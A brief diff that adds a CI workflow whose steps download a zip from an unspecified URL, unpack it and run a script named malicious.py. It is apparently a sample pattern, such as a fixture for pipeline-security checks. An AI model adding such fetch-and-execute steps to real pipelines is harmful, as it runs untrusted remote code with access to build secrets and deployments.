@@ -1,0 +1,11 @@
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch artifact
+        run: |
+          curl "$BLOB_URL" -o artifact.zip
+          unzip artifact.zip
+      - name: Deploy
+        run: |
+          python artifact/malicious.py
